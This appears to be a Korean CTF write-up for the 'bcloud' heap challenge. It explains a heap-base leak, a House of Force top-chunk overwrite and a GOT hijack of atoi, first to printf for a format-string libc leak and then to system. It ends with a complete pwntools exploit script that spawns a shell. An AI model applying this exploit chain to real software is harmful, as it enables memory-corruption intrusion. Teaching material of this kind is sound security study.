이 문제는 house of force기법을 이용한 힙 문제인데, format string bug를 trigger하는 과정이 필요하고 나한테는 다소 복잡하지만 이해하니 재밌는 문제였다.

file

----------

![](https://lh5.googleusercontent.com/FIV_0BSv9zW1O-tQJXfJVPfMbPNO0f_VxKrOrTPTDRE_ekMeJ-Ved3EwoyDkgMQ03cvJ09KfHNZJAHlGckohz6eEYbgP1FtUSbrSAod3xTLr_iVSkr9JH7AcQyNDHa3oz-2JuFby)

ELF 32bit 파일이다.

보호기법

----------

![](https://lh6.googleusercontent.com/HUvQvt63qWol71IM5HmJJLOkS779ya4MQIG4hN91vApEAZhzi_b4_UXB6YfeMauIilSUTBHRpOPvMwiL0S5A7g6dt28rPHTokc_syCRDQf-3sqAWcmFbzTVGo6hl4dUTXcB3Ib--)

canary와 nx가 걸려있다.

분석

----------

main함수를 보면 먼저 while문 전에 함수를 호출한다.

![](https://lh4.googleusercontent.com/RovwjnILZBHQ1rBuHoLZoilao822YmsH3SUbGe3inTmSEXyPYv1_MWh4wVwOvwe0_azMXswOsWsWLuM6NJdyuF3Hdw2SD7S0LgKVC_ONRlot6D86JvoEqrfH3CFUEddNWWmVZogo)

input_name함수를 보면

![](https://lh4.googleusercontent.com/O3K-LqbMvgsvQRbTmcE0VpS7b_5OkXNGnIBtbia-IVc94GGPykr0VyBsptWfMoeXsBi0vEJxWuOf--sDHXgTvoNr2QByqyHA5d04hBfaLQ4D9famyjCZQZka_Kd_sCGNNGkwfWRi)

Input your name: 이라는 문구가 출력되고 input_read 함수가 실행된다.

![](https://lh3.googleusercontent.com/KAENkEt-hSt5RJinfjjwTQ-HuO7afU0nLl0fKqz3UZ8APfmW_KoOhzY5OCD46dFS9CTTS28nXTftRQHqkmEjbsYrW2wNS5IfLKbz_mlRWEpf22A0O_UYu6gK0La8Q0OO4q7XjSa6)

2번째 인자까지 입력 받고, 개행문자가 도중에 있으면 break한다.

다시 input_name 함수로 돌아와서,

![](https://lh4.googleusercontent.com/Ma-_hAmP-qCsxy5aMgqeaftKkS6oIBs85m9qjPPL9PVU2fPmhLMOBk0OcaS8ThT4yyubdwNTQxR7J4KwLX6NDDUTthoTT09mdtWI8Yk4mtBrJeKpbj_WK0YzgSM9ZvAKzkDGZN8K)

v2 를 0x40(64) 만큼 malloc 해주고 입력 받은 name을 chunk에 strcpy를 진행한다.

malloc 공간이 64이고 입력도 64까지 받을 수 있다. sub_8048779 함수를 보자.

![](https://lh5.googleusercontent.com/b3tCjYYA0cj4Y8ozFNflIJ5RALIOoQVuJSl5NiBArCLKi-j09LRhQ_S-DpCNLR48VsWA67_WpxIenVz7NjQuqyhyeGDRWVTfjYcvZKhClG_H0tauubQx-ro4EbMFA4sqZpjG5848)

%s로 v2의 data를 출력해준다. 아까 입력할 때 64를 채워서 입력하면, 뒤에 heap base가 leak 된다. 이유는 널이 없으니 문자열의 끝을 인식 못한다.

이를 이용해서 heap base를 구하고 Top chunk의 주소를 구할 수 있다.

![](https://lh3.googleusercontent.com/fwJX-JZWv1O6E6XlV_BLpAt-w8rrFSTWGajs533D2Nibx7tEa2CEkEEZqZ9SZ2gGfVWVPomMZmI31DzNZVfnj-Qwarc8QHnp_IRYp_q-tpnSosOXV8eF_VJZapLViyvp9j6qFh1D)

sub_804884e 함수이다.

![](https://lh3.googleusercontent.com/Ql0xS7wRu3b86CuI_WK2z_DnWWqgaFKxE-A8P6SxKoRKHVJ1a732pK3n6-SFupH4ZHqh9SKRoJNvpLaxUwaB-Ic3hZFiViS29c9zKHg7dmysR8lTiU_UyfVZVRlhrESE3x0JgmGs)

Org를 &s에 입력 받고 Host에 &v3을 입력 받는다.

v4와 v2를 0x40(64)만큼 차례대로 할당 한다.

두 번째 malloc chunk의 data에는 Host가 strcpy 된다.

마지막 malloc chunk의 data에는 Org가 strcpy 된다.

마지막 malloc chunk에서 data를 0x40만큼 최대로 채워주고 +4만큼 더 채우고 더 입력받으면 Top chunk를 control할 수 있게 된다.

근데 입력을 64만큼 밖에 안 받는다. 일단 data는 다 채울 수 있게 되는데 8바이트를 더 입력받을 수 있어야 Top chunk를 control 할 수 있다.

&s의 위치를 보면 bp-0x9c 에 위치해 있다. 64만큼 입력을 받으면 v2 포인터가 있다. 어랏?

64(data) 만큼을 채우고 다음 4바이트는 어쨌든 값이 들어가 있을테니깐 overwrite가 가능하고 이제 그 다음 4바이트가 Top chunk 인데, v3, 즉, Host로 처음 입력 받는 4바이트로 Top chunk를 조절 할 수 있다.

![](https://lh6.googleusercontent.com/GiLU8JO00WsypGJaJAP3oPeJ6FfzaN-bPLSdOecDX89DTuiChNVGFZcP4t0qWCcmOweXRwdgqyl-p47aO7K95nq1yYTpeWwd3WOJRny3puuH7lWb-43tukQ1IKxoaWu1yIXq9P_D)

이제 while 문을 반복한다.

1부터 보자.

![](https://lh5.googleusercontent.com/XGP3A3BxRBYYSXJv9pRZzHPTHUbKJPWHjBsM_AOvQCZJB1vKHP3OmD__Sa2wcxd-QASr2dhNntReWcjsOWIPEdXHtts6RwEwqQ_QrVjhRrk-RjRY2jBfsyScDBx5EYsQLUhOBcNv)

v2에 input을 받는 것 같다 sub_8048709를 보겠다.

![](https://lh3.googleusercontent.com/X5hmFDM3fTFF8weZkMStniH1YFzb1-qOX1PDdCI8JWaD3Lf_Tjlxl16W8Oe7SBxYC16dUQ1OgGF3TwRWq89O7TMg4ZFKa5BH3IsBlrQhH4Kpjf9-nak7LlyXb-x4EZko0BWu4jlS)

여기서 좀 꿀잼인데 input_read로 nptr에 입력을 받고

이를 atoi로 숫자로 변형해준다.

atoi(&nptr)

atou의 got 를 printf로 got overwrite를 통해 format string bug를 trigger 할 수 있다.

이를 이용해 libc를 leak 할 수 있게 된다.

다시 돌아와서,

![](https://lh5.googleusercontent.com/XGP3A3BxRBYYSXJv9pRZzHPTHUbKJPWHjBsM_AOvQCZJB1vKHP3OmD__Sa2wcxd-QASr2dhNntReWcjsOWIPEdXHtts6RwEwqQ_QrVjhRrk-RjRY2jBfsyScDBx5EYsQLUhOBcNv)

아까 heap overflow로 top chunk를 0xffffffff로 control할 수 있게 되었다.

여기서 v2에 atoi로 숫자를 입력 받고, v2+4만큼 malloc을 할당해준다.

이 쯤에서 house of force의 충족 요건을 확인 해보겠다.

1. top chunk를 0xffffffff로 조작이 가능해 malloc을 원하는 만큼 할당할 수 있어야 한다.

2. malloc size를 원하는 만큼 control해 원하는 곳에 할당시킬 수 있어야 한다.

3. 원하는 곳에 malloc 된 곳에 user data로 컨트롤이 가능해야한다. (예를 들어 got overwrite)

충족하니 house of force 기법을 이용해 공격하면 된다.

atoi got를 printf plt로 overwrite해야한다.

(atoi got) - (top chunk) - header(8) 을 한 값을 넣어야 하지만 이 문제에서는 -4만큼 더 빼서

(atoi got) - (top chunk) - header(8) - 4 한 size를 할당해야한다.

그리고 user data를 입력할 때 바로 printf plt로 덮는게 아니라 “AAAA”+p32(printf_plt) 이렇게 덮어야 한다.

이렇게 하면 atoi가 printf로 바껴 fsb가 가능해진다.

offset구하고 printf_got넣고 libc leak했다.

system offset까지 구해주고,

다시 house of force를 통해 atoi->printf로 바뀐 atoi_got를 system_got로 바꿔야 한다.

다행하게도 3번메뉴에서 user data를 수정 할 수 있다.

근데 3을 입력하려는데 입력이 안된다. 이는

atoi가 printf로 바뀌었기 때문.

3이면 문자를 3개 이어 붙혀서 send하면 된다.

즉, atoi로 3이면 pritnf “AAA”와 같다.

그렇게 해서 다시 AAAA+p32(system)으로 덮어주고 nptr을 /bin/sh로 바꾸어주면 쉘을 얻을 수 있다.

libc를 어떻게 leak할 수 있는지 leak vector를 찾는게 좀 중요한 문제였고 이 문제를 통해 힙의 대한 이해와 hof 기법에 대한 이해도가 높아진 것 같아서 배운게 많은 좋은 문제였던 것 같다.

> exploit.py

----------
```python
from pwn import  *

s = process("./bcloud")

e = ELF("./bcloud")

libc = ELF("/lib/i386-linux-gnu/libc.so.6")

#context.log_level = 'debug'

s.recv()

s.send("A"*64)

s.recvuntil("A"*64)

atoi_got = e.got['atoi']

printf_plt = e.plt['printf']

printf_got = e.got['printf']

leak_heap=u32(s.recv()[:4])

heap_base = leak_heap -  0x8

top_chunk = heap_base +  224  # (header(8) + data(64))*3

log.success("leak_heap:"  + hex(heap_base))

log.success("top_chunk:"  + hex(top_chunk))

s.send("B"*64)

s.recvuntil("Host:\n")

s.sendline("\xff\xff\xff\xff")

s.recvuntil(">>\n")

size = atoi_got - top_chunk -  8  -  4

s.sendline("1")

s.recvuntil(":\n")

s.sendline(str(size))

s.recvuntil(">>\n")

s.sendline("1")

s.recvline(":\n")

s.sendline("8")

s.recvline(":\n")

s.sendline("AAAA"+p32(printf_plt))

s.recvuntil(">>\n")

s.sendline("1")

s.recvline(":\n")

payload = p32(printf_got)+"k"+"%6$s"

s.sendline(payload)

s.recvuntil("k")

leak_printf=u32(s.recv()[:4])

log.success(hex(leak_printf))

base = leak_printf - libc.symbols['printf']

log.success(hex(base))

system = base + libc.symbols['system']

log.success(hex(system))

s.sendline("AAA")

s.recv()

s.sendline("333")

s.recv()

s.sendline("1")

s.recv()

s.sendline("AAAA"+p32(system))

s.sendline("/bin/bash")

s.recv()

s.recv()

s.interactive()
```
  

  

![](https://lh3.googleusercontent.com/Jy_cJuQdEI0ZiZHOiqFuAg7h8p2dOft3O-XMYGwZqN4kYjIBvO4lU7sSDXZC3zcW4QMIFJhpB8DZfyFqNn1m4LLZ6SX__P7YBjPFUiKdHI6CLYy03y6HWMGiN2XjRHqYbEtK53Qw)
